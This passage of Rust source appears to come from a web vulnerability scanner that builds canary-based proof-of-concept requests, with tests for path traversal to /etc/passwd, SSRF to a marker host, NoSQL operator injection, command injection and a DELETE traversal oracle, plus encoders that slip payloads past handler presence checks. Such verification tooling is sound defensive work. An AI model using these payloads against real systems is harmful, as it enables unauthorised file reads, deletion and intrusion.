        "{{\"{}\":\"{}\",\"{}\":\"{}\"}}",
        json_escape(field),
        json_escape(value),
        json_escape(other),
        json_escape(other_value)
    )
}

/// Packs `value` into the handler's base64-encoded JSON envelope: a JSON object with `value` under
/// the payload-bearing member and a harmless placeholder under every other member the handler reads
/// (so an early presence guard passes), base64-encoded in the alphabet the handler decodes.
fn envelope_encode(env: &Envelope, value: &str) -> String {
    let mut obj = format!(
        "{{\"{}\":\"{}\"",
        json_escape(&env.field),
        json_escape(value)
    );
    for member in &env.siblings {
        obj.push_str(&format!(
            ",\"{}\":\"{}\"",
            json_escape(member),
            ENVELOPE_PLACEHOLDER
        ));
    }
    obj.push('}');
    base64(obj.as_bytes(), env.url_safe)
}

/// Packs `value` into the structured document the handler's parse function will accept: a JSON object
/// with `value` under the sink-reaching key and a harmless placeholder under every other member the
/// handler reads (so a presence/validity guard passes), wrapped in the literal scaffold the extraction
/// regexes require (frontmatter delimiters, a `metadata:` label).
fn doc_encode(doc: &DocEnvelope, value: &str) -> String {
    let mut obj = format!(
        "{{\"{}\":\"{}\"",
        json_escape(&doc.sink_key),
        json_escape(value)
    );
    for key in &doc.filler_keys {
        obj.push_str(&format!(
            ",\"{}\":\"{}\"",
            json_escape(key),
            ENVELOPE_PLACEHOLDER
        ));
    }
    obj.push('}');
    format!("{}{}{}", doc.prefix, obj, doc.suffix)
}

/// Base64-encodes bytes, in the URL-safe alphabet (`-_`, no padding) when `url_safe`, otherwise
/// standard (`+/`, padded). Node's `Buffer.from` decodes either form, so the encoder matches the
/// handler's declared encoding exactly.
fn base64(input: &[u8], url_safe: bool) -> String {
    let table: &[u8; 64] = if url_safe {
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    } else {
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    };
    let encoded = |n: u32, shift: u32| {
        table
            .get(((n >> shift) & 63) as usize)
            .copied()
            .map(char::from)
            .unwrap_or('=')
    };
    let mut out = String::with_capacity(input.len().div_ceil(3) * 4);
    for chunk in input.chunks(3) {
        let b0 = u32::from(chunk.first().copied().unwrap_or_default());
        let b1 = u32::from(chunk.get(1).copied().unwrap_or_default());
        let b2 = u32::from(chunk.get(2).copied().unwrap_or_default());
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(encoded(n, 18));
        out.push(encoded(n, 12));
        if chunk.len() > 1 {
            out.push(encoded(n, 6));
        } else if !url_safe {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(encoded(n, 0));
        } else if !url_safe {
            out.push('=');
        }
    }
    out
}

fn json_escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            other => out.push(other),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::super::plan::{AppendedParam, Entry, Method, Probe};
    use super::*;

    fn probe(class: VulnClass, path: &str, entry: Entry) -> Probe {
        Probe {
            method: Method::Get,
            path: path.to_owned(),
            entry,
            class,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
            url_query_params: Vec::new(),
            read_suffix: None,
            envelope: None,
            doc_envelope: None,
            lists_dir: false,
            removes: false,
            appended_param: None,
            path_fillers: Vec::new(),
        }
    }

    #[test]
    fn an_envelope_ssrf_packs_the_marker_url_into_the_decoded_object() {
        use super::super::plan::Envelope;
        let canary = Canary::new("tok".to_owned());
        let mut p = probe(
            VulnClass::Ssrf,
            "/proxy/translated/{id}.srt",
            Entry::PathParam("id".to_owned()),
        );
        p.envelope = Some(Envelope {
            field: "url".to_owned(),
            siblings: vec!["from".to_owned(), "to".to_owned()],
            url_safe: true,
        });
        let a = attempts(&p, &canary, 1);
        assert_eq!(a.len(), 1);
        let seg = a[0]
            .target
            .strip_prefix("/proxy/translated/")
            .and_then(|s| s.strip_suffix(".srt"))
            .expect("payload fills the route's {id} slot");
        // The segment is the base64url envelope carrying the marker URL under `url`, with the
        // handler's other required members present so its presence guard passes.
        let expected = base64(
            format!(
                "{{\"url\":\"{}\",\"from\":\"{ENVELOPE_PLACEHOLDER}\",\"to\":\"{ENVELOPE_PLACEHOLDER}\"}}",
                canary.service_url(1)
            )
            .as_bytes(),
            true,
        );
        assert_eq!(seg, expected);
        // base64url is a single clean path segment (no `/`, no `=` padding).
        assert!(!seg.contains('/') && !seg.contains('='));
        assert_eq!(a[0].signal, Signal::ServiceReached(canary.service_token(1)));
    }

    #[test]
    fn a_delete_oracle_climbs_outside_the_base_with_a_surviving_control() {
        let canary = Canary::new("tok".to_owned());
        // A removal sink that appends a fixed segment after the tainted route parameter.
        let mut p = probe(
            VulnClass::PathTraversal,
            "/deploy/skills/{platform}",
            Entry::PathParam("platform".to_owned()),
        );
        p.method = Method::Delete;
        p.read_suffix = Some("SKILL.md".to_owned());
        p.removes = true;
        let oracle =
            delete_oracle(&p, &canary, 7).expect("a path-param removal sink has an oracle");
        // The target sits outside the base directory (under the planted-canary root) and ends in the
        // handler's own appended segment; the control is a sibling the request never names.
        assert!(oracle.target_path.starts_with(&format!("/{PLANTED_DIR}/")));
        assert!(oracle.target_path.ends_with("/SKILL.md"));
        assert!(oracle.control_path.starts_with(&oracle.dir));
        assert_ne!(oracle.target_path, oracle.control_path);
        // The present request places a climbing value as a single percent-encoded segment, so the
        // `/`-bearing traversal survives route matching.
        assert_eq!(oracle.present.verb, "DELETE");
        let seg = oracle
            .present
            .target
            .strip_prefix("/deploy/skills/")
            .expect("payload fills the route slot");
        assert!(seg.contains("..%2F") && !seg.contains('/'));
    }

    #[test]
    fn a_query_traversal_climbs_from_several_depths() {
        let canary = Canary::new("abc123".to_owned());
        let a = attempts(
            &probe(
                VulnClass::PathTraversal,
                "/api/files",
                Entry::Query("name".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with("/api/files?name=")));
        assert!(a.iter().any(|x| {
            matches!(&x.signal, Signal::ResponseContains(expected)
                if expected == "root:x:0:0:root:")
                && x.target.contains("etc")
                && x.target.contains("passwd")
        }));
        // The canary secret is content only. Echoing a requested URL cannot verify the read.
        assert!(a.iter().all(|x| !x.target.contains("abc123")));
        assert!(a.len() >= 4);
    }

    #[test]
    fn a_body_ssrf_targets_the_marker_service() {
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/fetch",
                Entry::Body(Some("url".to_owned())),
            ),
            &canary,
            0,
        );
        assert_eq!(a.len(), 1);
        assert_eq!(a[0].signal, Signal::ServiceReached("tok-0".to_owned()));
        assert_eq!(
            a[0].body.as_deref(),
            Some("{\"url\":\"http://jss-marker/tok-0\"}")
        );
    }

    #[test]
    fn a_registered_callback_replaces_the_private_marker_hostname() {
        let host = format!("{}.callback.satori.ci", "a".repeat(32));
        let canary = Canary::new("run".to_owned()).with_callback_host(Some(host.clone()));
        assert_eq!(canary.marker_host(), host);
        assert_eq!(canary.service_url(2), format!("http://{host}/run-2"));
    }

    #[test]
    fn a_header_ssrf_tries_the_url_and_the_host_shapes() {
        // The header may carry a whole URL, or just the destination host of a fixed-port request.
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/{any}",
                Entry::Header("wx-host".to_owned()),
            ),
            &canary,
            2,
        );
        assert_eq!(a.len(), 2);
        // URL shape: the full marker URL as the header value, route path a placeholder.
        assert_eq!(
            a[0].headers,
            vec![("wx-host".to_owned(), "http://jss-marker/tok-2".to_owned())]
        );
        // Host shape: the bare marker host as the header, the probe token riding the forwarded
        // route path.
        assert_eq!(
            a[1].headers,
            vec![("wx-host".to_owned(), "jss-marker".to_owned())]
        );
        assert_eq!(a[1].target, "/tok-2");
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached("tok-2".to_owned()))
        );
    }

    #[test]
    fn a_header_ssrf_carries_the_sibling_headers_the_handler_forwards() {
        // The handler forwards another request header into the outbound request
        // (`headers: { Authorization: req.headers.authorization }`). Both SSRF shapes must send
        // that sibling header, or the outbound request errors on an `undefined` value before the
        // sink is reached.
        let canary = Canary::new("tok".to_owned());
        let mut p = probe(
            VulnClass::Ssrf,
            "/{any}",
            Entry::Header("backendurl".to_owned()),
        );
        p.siblings = vec![("authorization".to_owned(), "jsspector".to_owned())];
        let a = attempts(&p, &canary, 2);
        assert_eq!(a.len(), 2);
        for attempt in &a {
            assert!(
                attempt
                    .headers
                    .contains(&("authorization".to_owned(), "jsspector".to_owned())),
                "sibling header missing from {attempt:?}"
            );
            // The tainted header is still present exactly once.
            assert_eq!(
                attempt
                    .headers
                    .iter()
                    .filter(|(name, _)| name == "backendurl")
                    .count(),
                1
            );
        }
    }

    #[test]
    fn an_unnamed_body_tries_likely_fields() {
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(VulnClass::Ssrf, "/fetch", Entry::Body(None)),
            &canary,
            0,
        );
        assert_eq!(a.len(), 8);
        assert_eq!(a[0].body.as_deref(), Some("\"http://jss-marker/tok-0\""));
        assert!(a.iter().any(|attempt| {
            attempt.body.as_deref() == Some("{\"url\":\"http://jss-marker/tok-0\"}")
        }));
        assert!(a.iter().any(|attempt| {
            attempt.body.as_deref()
                == Some(
                    "{\"url\":\"http://jss-marker/tok-0\",\"filepath\":\"jsspector-placeholder\"}",
                )
        }));
    }

    #[test]
    fn a_command_injection_writes_the_marker_file() {
        let canary = Canary::new("t".to_owned());
        let a = attempts(
            &probe(
                VulnClass::CommandInjection,
                "/run",
                Entry::Query("host".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(
            a.iter().all(
                |x| matches!(&x.signal, Signal::FileWritten(f) if f == &canary.written_file(0))
            )
        );
        assert!(a.len() >= 4);
    }

    #[test]
    fn a_path_param_fills_its_slot() {
        let canary = Canary::new("z".to_owned());
        let a = attempts(
            &probe(
                VulnClass::PathTraversal,
                "/barcode/{key}",
                Entry::PathParam("key".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with("/barcode/")));
        assert!(a.iter().all(|x| !x.target.contains("{key}")));
    }

    #[test]
    fn a_directory_listing_accepts_only_its_probe_specific_filename() {
        let canary = Canary::new("shared".to_owned());
        let mut p = probe(
            VulnClass::PathTraversal,
            "/resources/{module}/{kind}",
            Entry::PathParam("module".to_owned()),
        );
        p.lists_dir = true;
        p.appended_param = Some(AppendedParam {
            name: "kind".to_owned(),
            values: vec!["info".to_owned(), "docs".to_owned()],
        });

        let a = attempts(&p, &canary, 4);
        assert_eq!(a.len(), 14);
        assert!(a.iter().all(|attempt| {
            matches!(&attempt.signal, Signal::ResponseContains(expected)
                if expected == &canary.listing_token(4))
        }));
        assert!(a.iter().all(|attempt| {
            attempt.target.contains("/info") || attempt.target.contains("/docs")
        }));
        // A different read sink in the same app session can return the generic canary document.
        // That proves neither that this directory was enumerated nor that its sink was reached.
        assert!(!reproduced(
            &a[0],
            &canary,
            &canary.planted_dir_document(),
            false,
            false,
        ));
        assert!(reproduced(
            &a[0],
            &canary,
            &format!("files: [{}]", canary.listing_token(4)),
            false,
            false,
        ));
    }

    #[test]
    fn a_path_param_ssrf_url_is_also_sent_as_one_encoded_segment() {
        let canary = Canary::new("s".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/media/{url}",
                Entry::PathParam("url".to_owned()),
            ),
            &canary,
            3,
        );
        let url = canary.service_url(3);
        assert_eq!(a.len(), 2);
        assert_eq!(a[0].target, format!("/media/{url}"));
        assert_eq!(
            a[1].target,
            format!("/media/{}", url.replace(':', "%3A").replace('/', "%2F"))
        );
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached(canary.service_token(3)))
        );
    }

    #[test]
    fn a_catch_all_url_becomes_the_path() {
        let canary = Canary::new("w".to_owned());
        let a = attempts(
            &probe(VulnClass::PathTraversal, "/{wildcard}", Entry::Url),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with('/')));
        assert!(a.iter().all(|x| !x.target.contains("{wildcard}")));
    }

    /// An SSRF through the request target itself (`new URL(req.url, base)`): the marker URL as a
    /// path, then as an absolute-form request target, both tied to the probe's own token.
    #[test]
    fn a_url_ssrf_is_also_sent_as_an_absolute_form_target() {
        let canary = Canary::new("u".to_owned());
        let a = attempts(
            &probe(VulnClass::Ssrf, "/{wildcard}", Entry::Url),
            &canary,
            4,
        );
        let url = canary.service_url(4);
        let targets: Vec<&str> = a.iter().map(|x| x.target.as_str()).collect();
        assert_eq!(targets, [format!("/{url}"), url.clone()]);
        assert!(a.iter().all(|x| x.verb == "GET" && x.body.is_none()));
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached(canary.service_token(4)))
        );
        // Other classes through the URL keep the path form only.
        let traversal = attempts(
            &probe(VulnClass::PathTraversal, "/{wildcard}", Entry::Url),
            &canary,
            4,
        );
        assert!(traversal.iter().all(|x| x.target.starts_with('/')));
    }

    #[test]
    fn a_use_mount_traversal_places_the_payload_under_the_mount_path() {
        // A middleware mounted at `/clients` only runs for requests under that prefix and reads the
        // full original URL, so the climbing payload must ride beneath the mount, not at the root.
        let canary = Canary::new("tok".to_owned());
        let mut p = probe(VulnClass::PathTraversal, "/clients", Entry::Url);
        p.method = Method::Use;
        let a = attempts(&p, &canary, 1);
        assert!(a.iter().all(|x| x.verb == "GET"));
        assert!(
            a.iter().all(|x| x.target.starts_with("/clients/")),
            "every payload rides under the mount: {:?}",
            a.iter().map(|x| &x.target).collect::<Vec<_>>()
        );
        assert!(
            a.iter().any(|x| x.target == "/clients/../../../etc/passwd"),
            "a climbing payload reaches outside the mount: {:?}",
            a.iter().map(|x| &x.target).collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_url_ssrf_tries_the_marker_in_each_mined_query_param_under_each_gate() {
        // The request URL feeds a query parameter that chooses the outbound host; the marker URL is
        // sent in each mined parameter, under each path the handler dispatches on.
        let canary = Canary::new("tok".to_owned());
        let mut p = probe(VulnClass::Ssrf, "/dsh-wallpaper-bg", Entry::Url);
        p.gate_paths = vec!["/dsh-wallpaper-bg/we".to_owned()];
        p.url_query_params = vec!["base".to_owned()];
        let a = attempts(&p, &canary, 1);
        let want = format!(
            "/dsh-wallpaper-bg/we?base={}",
            encode(&canary.service_url(1))
        );
        assert!(
            a.iter()
                .any(|x| x.target == want
                    && x.signal == Signal::ServiceReached(canary.service_token(1))),
            "no query-param marker attempt in {:?}",
            a.iter().map(|x| &x.target).collect::<Vec<_>>()
        );
        // The payload value is the marker URL, never a target-specific host.
        assert!(a.iter().all(|x| !x.target.contains("127.0.0.1")));
    }

    #[test]
    fn nosql_cases_place_matching_operators_in_the_body() {
        let canary = Canary::new("tok".to_owned());
        let cases = nosql_cases(
            &probe(VulnClass::NosqlInjection, "/api/user", Entry::Body(None)),
            &canary,
            1,
        );
        assert_eq!(cases.len(), NOSQL_FIELDS.len());
        let id = cases.iter().find(|case| case.field == "id").unwrap();
        assert_eq!(
            id.match_all.body.as_deref(),
            Some("{\"id\":{\"$ne\":\"jssnomatchtok1\"}}")
        );
        assert_eq!(
            id.match_none_eq.body.as_deref(),
            Some("{\"id\":{\"$eq\":\"jssnomatchtok1\"}}")
        );
        assert_eq!(
            id.match_none_in.body.as_deref(),
            Some("{\"id\":{\"$in\":[]}}")
        );

        let mut targeted = probe(
            VulnClass::NosqlInjection,
            "/api/auth/signup",
            Entry::Body(Some("email".to_owned())),
        );
        targeted.siblings = vec![
            ("name".to_owned(), "jsspector".to_owned()),
            ("password".to_owned(), "Valid1!x".to_owned()),
        ];
        let targeted = nosql_cases(&targeted, &canary, 2);
        assert_eq!(targeted[0].field, "email");
        assert_eq!(
            targeted[0].match_all.body.as_deref(),
            Some(
                "{\"email\":{\"$ne\":\"jssnomatchtok2\"},\"name\":\"jsspector\",\"password\":\"Valid1!x\"}"
            )
        );
    }

    #[test]
    fn nosql_reproduction_needs_agreeing_controls_and_a_distinct_match_all() {
        assert!(nosql_reproduced(
            "{\"_id\":\"abc\"}",
            "{\"error\":\"not found\"}",
            "{\"error\":\"not found\"}",
            ""
        ));
        assert!(!nosql_reproduced("not found", "not found", "not found", ""));
        assert!(!nosql_reproduced("record", "echo $eq", "echo $in", ""));
        assert!(!nosql_reproduced("  ", "not found", "not found", ""));
    }

    #[test]
    fn nosql_reproduction_normalizes_operator_echoes_without_accepting_plain_echoes() {
        let token = "jssnomatchtok1";
        let found = "{\"message\":\"already exists\"}";
        let eq = "{\"error\":\"cast { '$eq': 'jssnomatchtok1' }\"}";
        let inside = "{\"error\":\"cast { '$in': [] }\"}";
        assert!(nosql_reproduced(found, eq, inside, token));

        let ne_echo = "{\"echo\":{\"$ne\":\"jssnomatchtok1\"}}";
        let eq_echo = "{\"echo\":{\"$eq\":\"jssnomatchtok1\"}}";
        let in_echo = "{\"echo\":{\"$in\":[]}}";
        assert!(!nosql_reproduced(ne_echo, eq_echo, in_echo, token));
    }

    #[test]
    fn reproduced_reads_the_signal() {
        let canary = Canary::new("TOKEN".to_owned());
        let in_response = Attempt {
            verb: "GET",
            target: "/x".to_owned(),
            body: None,
            headers: Vec::new(),
            signal: Signal::InResponse,
        };
        assert!(reproduced(
            &in_response,
            &canary,
            "...TOKEN...",
            false,
            false
        ));
        assert!(!reproduced(&in_response, &canary, "nothing", true, true));
        let passwd = Attempt {
            signal: Signal::ResponseContains("root:x:0:0:root:".to_owned()),
            ..in_response.clone()
        };
        assert!(reproduced(
            &passwd,
            &canary,
            "root:x:0:0:root:/root:/bin/bash",
            false,
            false
        ));
        assert!(!reproduced(
            &passwd,
            &canary,
            "/../../../etc/passwd",
            false,
            false
        ));
        let written = Attempt {
            signal: Signal::FileWritten(canary.written_file(0)),
            ..in_response.clone()
        };
        assert!(reproduced(&written, &canary, "", true, false));
        assert!(!reproduced(&written, &canary, "", false, false));
        let service = Attempt {
            signal: Signal::ServiceReached(canary.service_token(0)),
            ..in_response
        };
        assert!(reproduced(&service, &canary, "", false, true));
    }
}
